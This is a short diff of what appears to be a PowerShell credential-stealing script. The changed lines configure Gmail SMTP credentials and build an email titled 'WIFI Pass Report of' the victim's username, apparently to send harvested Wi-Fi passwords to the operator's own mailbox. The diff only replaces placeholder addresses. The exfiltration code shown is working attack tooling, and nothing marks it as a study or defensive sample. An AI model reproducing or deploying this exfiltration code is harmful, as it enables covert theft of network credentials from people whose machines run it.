@@ -19,16 +19,16 @@ $SMTPServer = 'smtp.gmail.com'
   $SMTPInfo.EnableSsl = $true
 
 
-  $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('username@gmail.com', 'password')
+  $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('yourusername@gmail.com', 'password')
 
 
   $ReportEmail = New-Object System.Net.Mail.MailMessage
 
 
-  $ReportEmail.From = 'username@gmail.com'
+  $ReportEmail.From = 'yourusername@gmail.com'
 
 
-  $ReportEmail.To.Add('username@gmail.com')
+  $ReportEmail.To.Add('yourusername@gmail.com')
 
 
   $ReportEmail.Subject = 'WIFI Pass Report of ' + $env:UserName
